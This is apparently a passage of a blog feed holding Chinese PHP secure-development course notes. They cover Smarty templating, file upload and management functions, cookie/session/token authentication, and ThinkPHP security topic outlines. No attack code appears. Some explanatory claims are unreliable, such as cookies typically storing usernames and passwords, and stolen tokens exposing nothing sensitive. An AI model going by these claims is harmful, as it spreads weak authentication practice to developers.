title="实例测试-某违规APP-密码找回&amp;JS验证逻辑安全"></a>实例测试-某违规APP-密码找回&amp;JS验证逻辑安全</h2>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 安全开发 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>27安全开发-TP框架</title>
      <link href="/2023/10/09/27%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91-TP%E6%A1%86%E6%9E%B6/"/>
      <url>/2023/10/09/27%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91-TP%E6%A1%86%E6%9E%B6/</url>
      
        <content type="html"><![CDATA[<h2 id="思维导图"><a href="#思维导图" class="headerlink" title="思维导图"></a>思维导图</h2><p>见 <a href="http://z7yy.top/2023/10/07/22%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91-php%E5%BA%94%E7%94%A8/">22安全开发</a></p><h2 id="知识点："><a href="#知识点：" class="headerlink" title="知识点："></a>知识点：</h2><ul><li>16、TP框架-开发-路由访问&amp;数据库&amp;文件上传&amp;MVC模型</li><li>17、TP框架-安全-不合规写法&amp;内置过滤绕过&amp;版本安全漏洞</li></ul><h2 id="章节点"><a href="#章节点" class="headerlink" title="章节点"></a>章节点</h2><p>PHP：<br>功能：新闻列表，会员中心，资源下载，留言版，后台模块，模版引用，框架开发等<br>技术：输入输出，超全局变量，数据库操作，逻辑架构，包含上传&amp;下载删除;<br>技术：JS&amp;CSS混用，Cookie,Session操作，MVC架构，ThinkPHP引用等。<br>JS：内容筹备中……<br>Java:内容筹备中……  </p><h2 id="TP框架-开发-配置架构-路由-MVC模型"><a href="#TP框架-开发-配置架构-路由-MVC模型" class="headerlink" title="TP框架-开发-配置架构&amp;路由&amp;MVC模型"></a>TP框架-开发-配置架构&amp;路由&amp;MVC模型</h2><p>参考：<a href="https://www.kancloud.cn/manual/thinkphp5_1">https://www.kancloud.cn/manual/thinkphp5_1</a>  </p><ul><li>1、配置架构-导入使用  </li><li>2、路由访问-URL访问  </li><li>3、数据库操作-应用对象  </li><li>4、文件上传操作-应用对象  </li><li>5、前端页面渲染-MVC模型</li></ul><h2 id="TP框架-安全-不安全写法-版本过滤绕过"><a href="#TP框架-安全-不安全写法-版本过滤绕过" class="headerlink" title="TP框架-安全-不安全写法&amp;版本过滤绕过"></a>TP框架-安全-不安全写法&amp;版本过滤绕过</h2><ul><li>1、内置代码写法<br>例子：不合规的代码写法-TP5-自写  </li><li>2、框架版本安全<br>例子1：写法内置安全绕过-TP5-SQL注入<br>例子2：内置版本安全漏洞-TP5-代码执行</li></ul>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 安全开发 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>26安全开发-新闻 框架</title>
      <link href="/2023/10/09/26%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91-%E6%96%B0%E9%97%BB-%E6%A1%86%E6%9E%B6/"/>
      <url>/2023/10/09/26%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91-%E6%96%B0%E9%97%BB-%E6%A1%86%E6%9E%B6/</url>
      
        <content type="html"><![CDATA[<h2 id="思维导图"><a href="#思维导图" class="headerlink" title="思维导图"></a>思维导图</h2><p>见 <a href="http://z7yy.top/2023/10/07/22%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91-php%E5%BA%94%E7%94%A8/">22安全开发</a></p><h2 id="知识点："><a href="#知识点：" class="headerlink" title="知识点："></a>知识点：</h2><ul><li>13、PHP新闻显示-数据库操作读取显示</li><li>14、PHP模版引用-自写模版&amp;Smarty渲染</li><li>15、PHP模版安全-RCE代码执行&amp;三方漏洞</li></ul><h2 id="章节点"><a href="#章节点" class="headerlink" title="章节点"></a>章节点</h2><p>PHP：<br>功能：新闻列表，会员中心，资源下载，留言版，后台模块，模版引用，框架开发等<br>技术：输入输出，超全局变量，数据库操作，逻辑架构，包含上传&amp;下载删除;<br>技术：JS&amp;CSS混用，Cookie,Session操作，MVC架构，ThinkPHP引用等。<br>JS：内容筹备中……<br>Java:内容筹备中……  </p><h2 id="新闻列表"><a href="#新闻列表" class="headerlink" title="新闻列表"></a>新闻列表</h2><ul><li>1、数据库创建新闻存储  </li><li>2、代码连接数据库读取  </li><li>3、页面进行自定义显示</li></ul><h2 id="自写模版引用"><a href="#自写模版引用" class="headerlink" title="自写模版引用"></a>自写模版引用</h2><ul><li>1、页面显示样式编排  </li><li>2、显示数据插入页面  </li><li>3、引用模版调用触发</li></ul><h2 id="Smarty模版引用"><a href="#Smarty模版引用" class="headerlink" title="Smarty模版引用"></a>Smarty模版引用</h2><p>下载：<a href="https://github.com/smarty-php/smarty/releases">https://github.com/smarty-php/smarty/releases</a><br>使用：  </p><ul><li>1、创建一个文件夹，命名为smarty-demo。  </li><li>2、下载Smarty对应版本并解压缩到该文件夹中。  </li><li>3、创建一个PHP文件，命名为index.php，并在文件中添加以下代码：  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 引入 Smarty 类文件</span></span><br><span class="line"><span class="keyword">require</span>(<span class="string">&#x27;smarty-demo/libs/Smarty.class.php&#x27;</span>);</span><br><span class="line"><span class="comment">// 创建 Smarty 实例</span></span><br><span class="line"><span class="variable">$smarty</span> = <span class="keyword">new</span> <span class="title class_">Smarty</span>;</span><br><span class="line"><span class="comment">// 设置 Smarty 相关属性</span></span><br><span class="line"><span class="variable">$smarty</span>-&gt;template_dir = <span class="string">&#x27;smarty-demo/templates/&#x27;</span>;</span><br><span class="line"><span class="variable">$smarty</span>-&gt;compile_dir = <span class="string">&#x27;smarty-demo/templates_c/&#x27;</span>;</span><br><span class="line"><span class="variable">$smarty</span>-&gt;cache_dir = <span class="string">&#x27;smarty-demo/cache/&#x27;</span>;</span><br><span class="line"><span class="variable">$smarty</span>-&gt;config_dir = <span class="string">&#x27;smarty-demo/configs/&#x27;</span>;</span><br><span class="line"><span class="comment">// 赋值变量到模板中</span></span><br><span class="line"><span class="variable">$smarty</span>-&gt;<span class="title function_ invoke__">assign</span>(<span class="string">&#x27;title&#x27;</span>, <span class="string">&#x27;欢迎使用 Smarty&#x27;</span>);</span><br><span class="line"><span class="comment">// 显示模板</span></span><br><span class="line"><span class="variable">$smarty</span>-&gt;<span class="title function_ invoke__">display</span>(<span class="string">&#x27;index.tpl&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li><li>4、创建一个名为index.tpl的模板文件，并将以下代码复制到上述点定义文件夹中  <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>&#123;$title&#125;<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>&#123;$title&#125;<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>这是一个使用 Smarty 的例子。<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></li></ul><h2 id="代码RCE安全测试"><a href="#代码RCE安全测试" class="headerlink" title="代码RCE安全测试"></a>代码RCE安全测试</h2><ul><li>1、自写模版的安全隐患<br>php文件渲染模板时使用了代码执行函数——&gt;模板中加上可控变量造成代码执行</li><li>2、第三方Smarty的安全隐患<br>第三方插件 ueditor<br>第三方组件 shiro<br>也有安全隐患<br>代码审计——&gt;不仅仅是代码，还有引用的第三方软件<br>黑盒插件识别模板、特征<br>白盒文件，代码、特征</li></ul>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 安全开发 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>25安全开发-文件管理</title>
      <link href="/2023/10/08/25%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91-%E6%96%87%E4%BB%B6%E7%AE%A1%E7%90%86/"/>
      <url>/2023/10/08/25%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91-%E6%96%87%E4%BB%B6%E7%AE%A1%E7%90%86/</url>
      
        <content type="html"><![CDATA[<h2 id="思维导图"><a href="#思维导图" class="headerlink" title="思维导图"></a>思维导图</h2><p>见 <a href="http://z7yy.top/2023/10/07/22%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91-php%E5%BA%94%E7%94%A8/">22安全开发</a></p><h2 id="知识点："><a href="#知识点：" class="headerlink" title="知识点："></a>知识点：</h2><ul><li>11、PHP文件管理-下载&amp;删除功能实现</li><li>12、PHP文件管理-编辑&amp;包含功能实现</li></ul><h2 id="章节点"><a href="#章节点" class="headerlink" title="章节点"></a>章节点</h2><p>PHP：<br>功能：新闻列表，会员中心，资源下载，留言版，后台模块，模版引用，框架开发等<br>技术：输入输出，超全局变量，数据库操作，逻辑架构，包含上传&amp;下载删除;<br>技术：JS&amp;CSS混用，Cookie,Session操作，MVC架构，ThinkPHP引用等。<br>JS：内容筹备中……<br>Java:内容筹备中……<br> <img src="/2023/10/08/25%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91-%E6%96%87%E4%BB%B6%E7%AE%A1%E7%90%86/%E6%96%87%E4%BB%B6%E7%AE%A1%E7%90%86.png"></p><h2 id="PHP文件操作安全"><a href="#PHP文件操作安全" class="headerlink" title="PHP文件操作安全"></a>PHP文件操作安全</h2><p>-文件包含，文件上传，文件下载，文件删除，文件写入，文件遍历  </p><h2 id="文件包含："><a href="#文件包含：" class="headerlink" title="文件包含："></a>文件包含：</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">include() 在错误发生后脚本继续执行  </span><br><span class="line">require() 在错误发生后脚本停止执行  </span><br><span class="line">include_once() 如果已经包含，则不再执行  </span><br><span class="line">require_once() 如果已经包含，则不再执行  </span><br></pre></td></tr></table></figure><h2 id="文件上传："><a href="#文件上传：" class="headerlink" title="文件上传："></a>文件上传：</h2><p>1、无过滤机制<br>2、黑名单过滤机制<br>3、白名单过滤机制<br>4、文件类型过滤机制  </p><p>架构：<br>1、上传至服务器本身的存储磁盘(源码在一起)<br>2、云产品OSS存储对象去存储文件(泄漏安全)<br>3、把文件上传到其他域名,如：<a href="http://www.xiaodi8.com->upload.xiaodi8.com">www.xiaodi8.com-&gt;upload.xiaodi8.com</a>  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$_FILES：PHP中一个预定义的超全局变量，用于在上传文件时从客户端接收文件，并将其保存到服务器上。它是一个包含上传文件信息的数组，包括文件名、类型、大小、临时文件名等信息。  </span><br><span class="line">$_FILES[&quot;表单值&quot;][&quot;name&quot;] 获取上传文件原始名称  </span><br><span class="line">$_FILES[&quot;表单值&quot;][&quot;type&quot;] 获取上传文件MIME类型  </span><br><span class="line">$_FILES[&quot;表单值&quot;][&quot;size&quot;] 获取上传文件字节单位大小  </span><br><span class="line">$_FILES[&quot;表单值&quot;][&quot;tmp_name&quot;] 获取上传的临时副本文件名  </span><br><span class="line">$_FILES[&quot;表单值&quot;][&quot;error&quot;] 获取上传时发生的错误代码  </span><br><span class="line">move_uploaded_file() 将上传的文件移动到指定位置的函数  </span><br></pre></td></tr></table></figure><h2 id="文件显示："><a href="#文件显示：" class="headerlink" title="文件显示："></a>文件显示：</h2><p>1.打开目录读取文件列表<br>2.递归循环读取文件列表<br>3.判断是文件还是文件夹<br>4.PHP.INI目录访问控制  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">is_dir() 函数用于检查指定的路径是否是一个目录  </span><br><span class="line">opendir() 函数用于打开指定的目录，返回句柄，用来读取目录中的文件和子目录  </span><br><span class="line">readdir() 函数用于从打开的目录句柄中读取目录中的文件和子目录  </span><br><span class="line">open_basedir：PHP.INI中的设置用来控制脚本程序访问目录  </span><br><span class="line">ini_set(&#x27;open_basedir&#x27;,__DIR__); 设置配置文件中，只能访问本目录  </span><br></pre></td></tr></table></figure><h2 id="文件删除："><a href="#文件删除：" class="headerlink" title="文件删除："></a>文件删除：</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">unlink() 文件删除函数  </span><br><span class="line">调用命令删除：system shell_exec exec等  </span><br></pre></td></tr></table></figure><h2 id="文件下载："><a href="#文件下载：" class="headerlink" title="文件下载："></a>文件下载：</h2><p>修改HTTP头实现文件读取解析下载：  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">header(&quot;Content-Type: application/octet-stream&quot;);  </span><br><span class="line">header(&quot;Content-Disposition: attachment; filename=&quot;&quot;);  </span><br><span class="line">header(&quot;Content-Length: &quot; . filesize($file));  </span><br><span class="line">readfile($file);  </span><br></pre></td></tr></table></figure><h2 id="文件编辑："><a href="#文件编辑：" class="headerlink" title="文件编辑："></a>文件编辑：</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1、file_get_contents() 读取文件内容  </span><br><span class="line">2、fopen() fread() 文件打开读入  </span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 安全开发 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>24安全开发-文件管理</title>
      <link href="/2023/10/08/24%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91-%E6%96%87%E4%BB%B6%E7%AE%A1%E7%90%86/"/>
      <url>/2023/10/08/24%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91-%E6%96%87%E4%BB%B6%E7%AE%A1%E7%90%86/</url>
      
        <content type="html"><![CDATA[<h2 id="思维导图"><a href="#思维导图" class="headerlink" title="思维导图"></a>思维导图</h2><p>见 <a href="http://z7yy.top/2023/10/07/22%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91-php%E5%BA%94%E7%94%A8/">22安全开发</a></p><h2 id="知识点："><a href="#知识点：" class="headerlink" title="知识点："></a>知识点：</h2><ul><li>8、PHP文件管理-显示&amp;上传功能实现</li><li>9、文件上传-$_FILES&amp;过滤机制实现</li><li>10、文件显示-目录遍历&amp;过滤机制实现</li></ul><h2 id="章节点"><a href="#章节点" class="headerlink" title="章节点"></a>章节点</h2><p>PHP：<br>功能：新闻列表，会员中心，资源下载，留言版，后台模块，模版引用，框架开发等<br>技术：输入输出，超全局变量，数据库操作，逻辑架构，包含上传&amp;下载删除;<br>技术：JS&amp;CSS混用，Cookie,Session操作，MVC架构，ThinkPHP引用等。<br>JS：内容筹备中……<br>Java:内容筹备中……</p><h2 id="文件管理模块-上传-过滤机制"><a href="#文件管理模块-上传-过滤机制" class="headerlink" title="文件管理模块-上传-过滤机制"></a>文件管理模块-上传-过滤机制</h2><ul><li>1、无过滤机制  </li><li>2、黑名单过滤机制  </li><li>3、白名单过滤机制  </li><li>4、文件类型过滤机制  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$_FILES：PHP中一个预定义的超全局变量，用于在上传文件时从客户端接收文件，并将其保存到服务器上。它是一个包含上传文件信息的数组，包括文件名、类型、大小、临时文件名等信息。  </span><br><span class="line">$_FILES[&quot;表单值&quot;][&quot;name&quot;] 获取上传文件原始名称  </span><br><span class="line">$_FILES[&quot;表单值&quot;][&quot;type&quot;] 获取上传文件MIME类型  </span><br><span class="line">$_FILES[&quot;表单值&quot;][&quot;size&quot;] 获取上传文件字节单位大小  </span><br><span class="line">$_FILES[&quot;表单值&quot;][&quot;tmp_name&quot;] 获取上传的临时副本文件名  </span><br><span class="line">$_FILES[&quot;表单值&quot;][&quot;error&quot;] 获取上传时发生的错误代码  </span><br><span class="line">move_uploaded_file() 将上传的文件移动到指定位置的函数  </span><br></pre></td></tr></table></figure></li></ul><h2 id="文件管理模块-显示-过滤机制"><a href="#文件管理模块-显示-过滤机制" class="headerlink" title="文件管理模块-显示-过滤机制"></a>文件管理模块-显示-过滤机制</h2><p>功能：显示 上传 下载 删除 编辑 包含等<br>1.打开目录读取文件列表<br>2.递归循环读取文件列表<br>3.判断是文件还是文件夹<br>4.PHP.INI目录访问控制  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">is_dir() 函数用于检查指定的路径是否是一个目录  </span><br><span class="line">opendir() 函数用于打开指定的目录，返回句柄，用来读取目录中的文件和子目录  </span><br><span class="line">readdir() 函数用于从打开的目录句柄中读取目录中的文件和子目录  </span><br><span class="line">open_basedir：PHP.INI中的设置用来控制脚本程序访问目录  </span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 安全开发 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>23安全开发-php应用</title>
      <link href="/2023/10/07/23%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91-php%E5%BA%94%E7%94%A8/"/>
      <url>/2023/10/07/23%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91-php%E5%BA%94%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h2 id="思维导图"><a href="#思维导图" class="headerlink" title="思维导图"></a>思维导图</h2><p>见 <a href="http://z7yy.top/2023/10/07/22%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91-php%E5%BA%94%E7%94%A8/">22安全开发</a></p><h2 id="知识点："><a href="#知识点：" class="headerlink" title="知识点："></a>知识点：</h2><ul><li>5、PHP后台身份验证模块实现  </li><li>6、Cookie&amp;Session技术&amp;差异  </li><li>7、Token数据包唯一性应用场景  </li><li>项目1：用cookie做后台身份验证  </li><li>项目2：用session做后台身份验证  </li><li>项目3：用token做用户登录判断</li></ul><h2 id="章节点"><a href="#章节点" class="headerlink" title="章节点"></a>章节点</h2><p>PHP：<br>功能：新闻列表，会员中心，资源下载，留言版，后台模块，模版引用，框架开发等<br>技术：输入输出，超全局变量，数据库操作，逻辑架构，包含上传&amp;下载删除;<br>技术：JS&amp;CSS混用，Cookie,Session操作，MVC架构，ThinkPHP引用等。<br>JS：内容筹备中……<br>Java:内容筹备中……<br> <img src="/2023/10/07/23%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91-php%E5%BA%94%E7%94%A8/cookie1.png"><br> <img src="/2023/10/07/23%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91-php%E5%BA%94%E7%94%A8/cookie1.png"></p><h2 id="身份验证-Cookie使用"><a href="#身份验证-Cookie使用" class="headerlink" title="身份验证-Cookie使用"></a>身份验证-Cookie使用</h2><p>生成cookie的原理图过程：见图  </p><ul><li>1、客户端向服务器发送HTTP请求。  </li><li>2、服务器检查请求头中是否包含cookie信息。  </li><li>3、如果请求头中包含cookie信息，则服务器使用该cookie来识别客户端，否则服务器将生成一个新的cookie。  </li><li>4、服务器在响应头中设置cookie信息并将其发送回客户端。  </li><li>5、客户端接收响应并将cookie保存在本地。  </li><li>6、当客户端发送下一次HTTP请求时，它会将cookie信息附加到请求头中。  </li><li>7、服务器收到请求并检查cookie的有效性。  </li><li>8、如果cookie有效，则服务器响应请求。否则，服务器可能会要求客户端重新登录。</li></ul><p>setcookie(): 设置一个cookie并发送到客户端浏览器。<br>unset(): 用于删除指定的cookie。  </p><h2 id="身份验证-Session使用"><a href="#身份验证-Session使用" class="headerlink" title="身份验证-Session使用"></a>身份验证-Session使用</h2><ul><li>1、客户端向服务器发送HTTP请求。  </li><li>2、服务器为客户端生成一个唯一的session ID，并将其存储在服务器端的存储器中（如文件、数据库等）。  </li><li>3、服务器将生成的session ID作为一个cookie发送给客户端。  </li><li>4、客户端将session ID保存为一个cookie，通常是在本地浏览器中存储。  </li><li>5、当客户端在发送下一次HTTP请求时，它会将该cookie信息附加到请求头中，以便服务器可以通过该session ID来识别客户端。   </li><li>6、服务器使用session ID来检索存储在服务器端存储器中的与该客户端相关的session数据，从而在客户端和服务器之间共享数据。</li></ul><p>session_start(): 启动会话，用于开始或恢复一个已经存在的会话。<br>$_SESSION: 用于存储和访问当前会话中的所有变量。<br>session_destroy(): 销毁当前会话中的所有数据。<br>session_unset(): 释放当前会话中的所有变量。<br>Session存储路径：PHP.INI中session.save_path设置路径  </p><h2 id="唯一性判断-Token使用"><a href="#唯一性判断-Token使用" class="headerlink" title="唯一性判断-Token使用"></a>唯一性判断-Token使用</h2><ul><li>1、生成Token并将其存储在Session  </li><li>2、生成Token并将其绑定在Cookie触发  </li><li>3、尝试登录表单中带入Token验证逻辑  </li><li>4、思考Token安全特性</li></ul><h2 id="具体安全知识点："><a href="#具体安全知识点：" class="headerlink" title="具体安全知识点："></a>具体安全知识点：</h2><h3 id="Cookie和Session都是用来在Web应用程序中跟踪用户状态的机制"><a href="#Cookie和Session都是用来在Web应用程序中跟踪用户状态的机制" class="headerlink" title="Cookie和Session都是用来在Web应用程序中跟踪用户状态的机制"></a>Cookie和Session都是用来在Web应用程序中跟踪用户状态的机制</h3><ul><li>1、存储位置不同：<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Cookie是存储在客户端（浏览器）上的，而Session是存储在服务器端的。  </li><li>2、安全性不同：<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Cookie存储在客户端上，可能会被黑客利用窃取信息，而Session存储在服务器上，更加安全。  </li><li>3、存储容量不同：<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Cookie的存储容量有限，一般为4KB，而Session的存储容量理论上没有限制，取决于服务器的硬件和配置。  </li><li>4、生命周期不同：<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Cookie可以设置过期时间，即便关闭浏览器或者重新打开电脑，Cookie仍然存在，直到过期或者被删除。而Session一般默认在浏览器关闭后就会过期。  </li><li>5、访问方式不同：<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Cookie可以通过JavaScript访问，而Session只能在服务器端进行访问。  </li><li>6、使用场景不同：<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Cookie一般用于存储小型的数据，如用户的用户名和密码等信息。而Session一般用于存储大型的数据，如购物车、登录状态等信息。</li></ul><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;总之，Cookie和Session都有各自的优缺点，选择使用哪一种方式，取决于具体的应用场景和需求。一般来说，如果需要存储敏感信息或者数据较大，建议使用Session；如果只需要存储少量的数据，并且需要在客户端进行访问，可以选择使用Cookie。  </p><h3 id="在Web应用程序中，使用token和不使用token的主要差异在于身份验证和安全性。"><a href="#在Web应用程序中，使用token和不使用token的主要差异在于身份验证和安全性。" class="headerlink" title="在Web应用程序中，使用token和不使用token的主要差异在于身份验证和安全性。"></a>在Web应用程序中，使用token和不使用token的主要差异在于身份验证和安全性。</h3><ul><li>1.身份验证：<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;采用token机制的Web应用程序，用户在登录成功后会收到一个token，这个token可以在每次请求时发送给服务器进行身份验证。而不采用token机制的Web应用程序，一般会使用session机制来保存用户登录状态，服务器会在用户登录成功后创建一个session，之后的每个请求都需要在HTTP头中附带这个session ID，以便服务器能够验证用户身份。  </li><li>2、安全性：<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;采用token机制的Web应用程序，在服务器上不会存储用户的登录状态，只需要存储token即可。因此，即使token被盗取，黑客也无法获得用户的密码或者其他敏感信息。而不采用token机制的Web应用程序，一般会在服务器上存储用户的登录状态，因此如果服务器被黑客攻击，黑客可能会获得用户的敏感信息。  </li><li>3、跨域访问：<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;采用token机制的Web应用程序，在跨域访问时，可以使用HTTP头中的Authorization字段来传递token信息，方便实现跨域访问。而不采用token机制的Web应用程序，在跨域访问时，需使用cookie或session来传递用户身份信息，比较麻烦。</li></ul><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;总之，采用token机制可以提高Web应用程序的安全性，并且方便实现跨域访问。不过，使用token机制也需要开发者自己来实现身份验证和token的生成和验证，相对来说比较复杂。而不采用token机制，使用session机制则相对简单，但是安全性相对较低。因此，具体采用哪种机制，需要根据实际情况进行权衡和选择。  </p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 安全开发 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>22安全开发-php应用</title>
      <link href="/2023/10/07/22%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91-php%E5%BA%94%E7%94%A8/"/>
      <url>/2023/10/07/22%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91-php%E5%BA%94%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h2 id="思维导图"><a href="#思维导图" class="headerlink" title="思维导图"></a>思维导图</h2><p> <img src="/2023/10/07/22%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91-php%E5%BA%94%E7%94%A8/image3.png"></p><h2 id="知识点："><a href="#知识点：" class="headerlink" title="知识点："></a>知识点：</h2><p>1、PHP留言板前后端功能实现<br>2、数据库创建&amp;架构&amp;增删改查<br>3、内置超全局变量&amp;HTML&amp;JS混编<br>4、第三方应用插件&amp;传参&amp;对象调用</p><h2 id="章节点"><a href="#章节点" class="headerlink" title="章节点"></a>章节点</h2><p>PHP：<br>功能：新闻列表，会员中心，资源下载，留言版，后台模块，模版引用，框架开发等<br>技术：输入输出，超全局变量，数据库操作，逻辑架构，包含上传&amp;下载删除;<br>技术：JS&amp;CSS混用，Cookie,Session操作，MVC架构，ThinkPHP引用等。<br>JS：内容筹备中……<br>Java:内容筹备中……<br> <img src="/2023/10/07/22%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91-php%E5%BA%94%E7%94%A8/%E8%AF%84%E8%AE%BA%E5%8C%BA.png"></p><h2 id="开发环境："><a href="#开发环境：" class="headerlink" title="开发环境："></a>开发环境：</h2><p>DW + PHPStorm + PhpStudy + Navicat Premium<br>DW : HTML&amp;JS&amp;CSS开发<br>PHPStorm : 专业PHP开发IDE<br>PhpStudy ：Apache MYSQL环境<br>Navicat Premium: 全能数据库管理工具  </p><h2 id="数据导入-mysql架构-库表列"><a href="#数据导入-mysql架构-库表列" class="headerlink" title="数据导入-mysql架构&amp;库表列"></a>数据导入-mysql架构&amp;库表列</h2><p>1、数据库名，数据库表名，数据库列名<br>2、数据库数据，格式类型，长度，键等  </p><h2 id="数据库操作-mysqli函数-增删改查"><a href="#数据库操作-mysqli函数-增删改查" class="headerlink" title="数据库操作-mysqli函数&amp;增删改查"></a>数据库操作-mysqli函数&amp;增删改查</h2><p>PHP函数：连接，选择，执行，结果，关闭等<br>参考：<a href="https://www.runoob.com/php/php-ref-mysqli.html">https://www.runoob.com/php/php-ref-mysqli.html</a><br>常用：  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mysqli_connect()打开一个到MySQL的新的连接。  </span><br><span class="line">mysqli_select_db()更改连接的默认数据库。  </span><br><span class="line">mysqli_query()执行某个针对数据库的查询。  </span><br><span class="line">mysqli_fetch_row()从结果集中取得一行，并作为枚举数组返回。  </span><br><span 